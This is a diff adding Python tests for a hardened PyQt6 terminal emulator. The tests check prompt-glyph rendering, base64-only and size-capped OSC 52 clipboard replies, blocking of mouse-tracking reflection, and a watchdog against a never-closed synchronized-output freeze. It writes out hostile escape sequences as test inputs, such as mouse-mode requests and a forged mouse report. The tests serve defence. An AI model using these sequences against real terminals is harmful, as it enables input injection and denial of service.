+# override): the caret glyph plus the DISTINCT space marker, never a raw NBSP or a
+# full box, and never a plain ASCII space in the marker's place.
+_clp_screen = _clp.document().toPlainText()
+ok(chr(0x276F) in _clp_screen,
+   'claude prompt: the caret U+276F renders as its own glyph on screen (not boxed)')
+ok(_SPMARK in _clp_screen,
+   'claude prompt: the trailing NBSP is shown as the distinct space marker')
+ok(_ORA_BOX not in _clp_screen,
+   'claude prompt: the NBSP is the space marker, not the full box')
+ok(chr(0x00A0) not in _clp_screen,
+   'claude prompt: the marker never renders as the raw NBSP')
+# EXPORT (toPlainText): the marker maps to '_', leaving no marker and no raw NBSP.
+_clptxt = _clp.toPlainText()
+ok('_' in _clptxt and 'Try' in _clptxt,
+   'claude prompt: export maps the space marker to _')
+ok(_SPMARK not in _clptxt and chr(0x00A0) not in _clptxt,
+   'claude prompt: export leaves no marker glyph and no raw NBSP')
+# COPY (PRIMARY selection): pure ASCII, the marker as '_', never a space.
+_clp.selectAll()
+_clp_prim = _clp.createMimeDataFromSelection().text()
+ok('_' in _clp_prim and 'Try' in _clp_prim,
+   'claude prompt: copy keeps the marked NBSP as _ and the following text')
+ok(chr(0x00A0) not in _clp_prim and _SPMARK not in _clp_prim,
+   'claude prompt: copy never emits a raw NBSP or the marker glyph')
+ok(all(ord(c) < 128 for c in _clp_prim),
+   'claude prompt: the copied prompt row is pure ASCII (the confusable caret is dropped)')
+# TRANSCRIPT (saved record): lossless -- the marker is named inline in Detail form.
+_clp_tr = _clp.transcript_text()
+ok('<U+00A0 NO-BREAK SPACE>' in _clp_tr,
+   'claude prompt: a saved transcript names the NBSP inline (<U+00A0 NO-BREAK SPACE>)')
+ok(_SPMARK not in _clp_tr and chr(0x00A0) not in _clp_tr,
+   'claude prompt: the transcript leaves no marker glyph and no raw NBSP')
+_clp.close()
 
 # --- TUI mode (pyte is a required dependency: fail closed, do not skip) -------
 ok(tui_available(), 'python3-pyte available for TUI mode')
@@ -4035,6 +4354,21 @@ ok(len(_st) == 1 and _st[0].startswith(b'\x1b]52;c;'),
 import base64 as _b64                                              # noqa: E402
 eq(_b64.b64decode(_st[0].split(b';', 2)[2].rstrip(b'\x07')), b'clip-secret',
    'OSC 52 read: the reply carries the clipboard, base64-encoded')
+# base64-ONLY: the reply body carries no newline or control byte, so a granted read
+# cannot smuggle an injection onto the program's stdin.
+import re as _re_clip                                              # noqa: E402
+_clipbody = _st[0].split(b';', 2)[2].rstrip(b'\x07')
+ok(_re_clip.fullmatch(rb'[A-Za-z0-9+/]*={0,2}', _clipbody) is not None,
+   'OSC 52 read: the reply body is base64-only (no control/newline reaches stdin)')
+# SIZE-CAPPED: an oversized clipboard is truncated to _OSC_CLIP_MAX before encoding,
+# so a granted program cannot pull an unbounded read off the clipboard.
+from secure_terminal.terminal import _OSC_CLIP_MAX as _CLIPMAX    # noqa: E402
+_QGA.clipboard().setText('A' * (_CLIPMAX + 5000))
+_rqc, _stc = _clip_read(True, True)
+ok(len(_stc) == 1, 'OSC 52 read: an oversized clipboard still yields exactly one reply')
+eq(len(_b64.b64decode(_stc[0].split(b';', 2)[2].rstrip(b'\x07'))), _CLIPMAX,
+   'OSC 52 read: the clipboard reply is size-capped at _OSC_CLIP_MAX')
+_QGA.clipboard().setText('clip-secret')       # restore for later readers
 # rate-limited: a granted tab cannot be flood-exfiltrated
 _cg = SecureTerminal(command='/bin/cat', tui=True)
 _cg.apply_osc('osc_clipboard_read', True)
@@ -4228,26 +4562,65 @@ ok('#0;2' not in _gfxdoc and 'Gf=32' not in _gfxdoc and 'File=inline' not in _gf
 ok(_gfxsent == [], 'a graphics payload triggers no reply to the pty')
 _gfx.close()
 
-# --- mouse + focus reporting is never forwarded to the pty --------------------
-# even with a program requesting mouse (1000/1006) and focus (1004) reporting, a
-# click or focus change writes no escape to the child: mouse stays a local
-# selection function and focus is not a reportable event (compatibility page).
+# --- mouse-tracking-reflection oracle: mouse/wheel/focus never reach the pty ---
+# even with a program requesting EVERY mouse mode (1000 click / 1002 drag / 1003
+# any-event / 1006 SGR) and focus (1004) reporting, a real press/move/release/wheel
+# or focus change writes no report escape to the child: secure-terminal has no
+# mouse-report path, so mouse stays a local selection function. A vulnerable
+# terminal would answer each event with an ESC[<...M/m report on the child's stdin
+# (output turning later pointer motion into injected input). This mirrors the
+# terminal-poc-corpus 'mouse-tracking-reflection' PoC.
 from PyQt6.QtGui import QFocusEvent as _QFE            # noqa: E402
+from PyQt6.QtGui import QWheelEvent as _QWheel         # noqa: E402
+from PyQt6.QtCore import QPoint as _QPointMs           # noqa: E402
 _mf = SecureTerminal(command='/bin/cat', tui=True)
-feed_output(_mf, b'\x1b[?1000h\x1b[?1006h\x1b[?1004h')   # request mouse + focus reports
+feed_output(_mf, b'\x1b[?1000h\x1b[?1002h\x1b[?1003h\x1b[?1006h\x1b[?1004h')
 _mfsent = spy_writes(_mf)
 _mflb = Qt.MouseButton.LeftButton
-_mfpress = QMouseEvent(QEvent.Type.MouseButtonPress, QPointF(9, 9), QPointF(9, 9),
-                       _mflb, _mflb, Qt.KeyboardModifier.NoModifier)
-_mfrel = QMouseEvent(QEvent.Type.MouseButtonRelease, QPointF(9, 9), QPointF(9, 9),
-                     _mflb, Qt.MouseButton.NoButton, Qt.KeyboardModifier.NoModifier)
-_mf.mousePressEvent(_mfpress)
-_mf.mouseReleaseEvent(_mfrel)
+_mfnb = Qt.MouseButton.NoButton
+_mfnm = Qt.KeyboardModifier.NoModifier
+_mf.mousePressEvent(QMouseEvent(QEvent.Type.MouseButtonPress, QPointF(9, 9),
+                                QPointF(9, 9), _mflb, _mflb, _mfnm))
+_mf.mouseMoveEvent(QMouseEvent(QEvent.Type.MouseMove, QPointF(12, 6), QPointF(12, 6),
+                               _mfnb, _mflb, _mfnm))
+_mf.mouseReleaseEvent(QMouseEvent(QEvent.Type.MouseButtonRelease, QPointF(12, 6),
+                                  QPointF(12, 6), _mflb, _mfnb, _mfnm))
+_mf.wheelEvent(_QWheel(QPointF(12, 6), QPointF(12, 6), _QPointMs(0, 0),
+                       _QPointMs(0, -120), _mfnb, _mfnm,
+                       Qt.ScrollPhase.NoScrollPhase, False))
 _mf.focusInEvent(_QFE(QEvent.Type.FocusIn))
 _mf.focusOutEvent(_QFE(QEvent.Type.FocusOut))
 ok(_mfsent == [],
-   'mouse/focus events write no report escape to the pty (got %r)' % _mfsent)
+   'mouse-tracking: press/move/release/wheel/focus write no report escape to the '
+   'pty (got %r)' % _mfsent)
+# POSITIVE CONTROL: the spy is wired to the one choke point (_write); a synthetic
+# mouse report pushed through it MUST be caught, proving the zero above is a real
+# observation and not a dead spy.
+_mf._write(b'\x1b[<0;12;6M')                          # pylint: disable=protected-access
+ok(_mfsent == [b'\x1b[<0;12;6M'],
+   'mouse-tracking positive control: a mouse report through _write is observed '
+   '(the spy is live, so the empty result above is real)')
 _mf.close()
+
+# --- synchronized-output DoS: a never-closed ESC[?2026h must self-release -------
+# A program that opens a synchronized update (DECSET private mode 2026) and never
+# sends the closing ESC[?2026l would freeze the display forever if the terminal
+# held the frame unconditionally. secure-terminal bounds the hold with a 150ms
+# watchdog: the frame is painted even when the close never arrives, so output-driven
+# DoS cannot wedge the widget. This is the WIDGET-level observable -- the corpus
+# denial-of-service oracle measures the Qt-free render() path only, never the
+# sync-update hold, which is a live-widget timer.
+_sy = SecureTerminal(command='/bin/cat', tui=True)
+feed_output(_sy, b'\x1b[?2026h')                 # open a sync update, never close it
+feed_output(_sy, b'held-frame-content\n')        # painted only when the hold releases
+ok(_sy._sync_update, 'ESC[?2026h opens a synchronized-update hold')      # noqa: protected-access
+pump(230)                                        # > the 150ms watchdog bound
+ok(not _sy._sync_update,
+   'a never-closed synchronized update self-releases within the 150ms watchdog '
+   '(no output-driven display freeze)')
+ok('held-frame-content' in _sy.toPlainText(),
+   'the held frame is painted once the sync watchdog fires')
+_sy.close()
 
 # ADVERSARIAL reflection oracle: a hostile file/program does not just emit a
 # query -- it can ALSO emit output that tries to OPEN a reply first (fake the
